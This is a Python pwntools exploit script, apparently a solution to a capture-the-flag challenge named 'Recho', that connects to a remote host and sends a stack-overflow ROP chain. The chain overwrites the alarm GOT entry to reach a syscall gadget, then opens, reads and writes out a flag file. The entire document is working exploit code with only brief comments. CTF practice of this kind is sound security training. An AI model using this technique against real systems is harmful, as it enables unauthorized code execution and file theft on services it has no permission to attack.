#! /usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
elf=ELF('./55e6343a97c142599ebfecb375ddcbb0')
#p = process("./55e6343a97c142599ebfecb375ddcbb0")
p=remote('111.198.29.45',33489)
#gdb.attach(p, "c")
prdi=0x4008a3
prsi=0x4008a1
prdx=0x4006fe
prax=0x4006fc
padd=0x40070d
alarm=elf.plt['alarm']
read=elf.plt['read']
write=elf.plt['write']
alarm_got=elf.got['alarm']
flag=0x601058
bss=0x601090
payload='a'*0x38
# open(flag)
payload+=p64(prax)+p64(0x5)
payload+=p64(prdi)+p64(alarm_got)
payload+=p64(padd)
payload+=p64(prax)+p64(0x2)
payload+=p64(prdi)+p64(flag)
payload+=p64(prdx)+p64(0)
payload+=p64(prsi)+p64(0)+p64(0)
payload+=p64(alarm)
# write flag to bss
payload+=p64(prdi)+p64(3)
payload+=p64(prsi)+p64(bss)+p64(0)
payload+=p64(prdx)+p64(0x30)
payload+=p64(read)
# leak flag
payload+=p64(prdi)+p64(1)
payload+=p64(prsi)+p64(bss)+p64(0)
payload+=p64(prdx)+p64(0x30)
payload+=p64(write)
p.recvuntil('Welcome to Recho server!\n')
p.sendline(str(0x200))
payload=payload.ljust(0x200,'\x00')
sleep(1)
p.send(payload)
p.recv()
p.shutdown()
p.interactive()
p.close()

